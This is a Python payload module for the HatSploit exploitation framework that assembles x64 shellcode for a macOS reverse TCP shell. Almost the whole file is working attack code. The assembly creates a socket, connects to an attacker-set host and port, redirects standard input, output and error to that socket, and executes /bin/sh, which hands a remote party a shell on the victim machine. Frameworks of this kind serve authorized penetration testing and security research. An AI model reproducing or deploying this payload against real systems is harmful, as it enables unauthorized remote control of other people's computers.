"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.payload.basic import *
from pex.assembler import Assembler
from pex.socket import Socket


class HatSploitPayload(Payload, Assembler, Socket):
    def __init__(self):
        super().__init__()

        self.details = {
            'Name': "macOS x64 Shell Reverse TCP",
            'Payload': "macos/x64/shell_reverse_tcp",
            'Authors': [
                'Ivan Nikolsky (enty8080) - payload developer',
            ],
            'Description': "Shell reverse TCP payload for macOS x64.",
            'Architecture': "x64",
            'Platform': "macos",
            'Rank': "high",
            'Type': "reverse_tcp",
        }

    def run(self):
        return self.assemble(
            self.details['Architecture'],
            f"""
            start:
                mov r8b, 0x02
                shl r8, 24
                or r8, 0x61
                mov rax, r8

                xor rdx, rdx
                mov rsi, rdx
                inc rsi
                mov rdi, rsi
                inc rdi
                syscall

                mov r12, rax

                mov r13, 0x{self.rhost.little.hex()}{self.rport.little.hex()}0101
                mov r9b, 0xff
                sub r13, r9
                push r13
                mov r13, rsp

                inc r8
                mov rax, r8
                mov rdi, r12
                mov rsi, r13
                add rdx, 0x10
                syscall

                sub r8, 0x8
                xor rsi, rsi

            dup:
                mov rax, r8
                mov rdi, r12
                syscall

                cmp rsi, 0x2
                inc rsi
                jbe dup

                sub r8, 0x1f
                mov rax, r8

                xor rdx, rdx
                mov r13, 0x68732f6e69622f2f
                shr r13, 8
                push r13
                mov rdi, rsp
                xor rsi, rsi
                syscall
            """
        )
